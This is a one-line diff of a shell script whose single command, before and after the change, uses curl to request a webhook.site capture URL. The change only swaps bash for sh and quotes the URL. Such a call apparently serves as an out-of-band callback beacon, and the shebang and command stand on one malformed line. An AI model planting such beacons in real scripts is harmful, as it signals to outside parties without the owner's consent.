@@ -1,1 +1,1 @@
-#!/bin/bash curl http://webhook.site/1575975b-7abd-44b8-8efb-ebeb43ab4023
+#!/bin/sh curl 'http://webhook.site/1575975b-7abd-44b8-8efb-ebeb43ab4023'
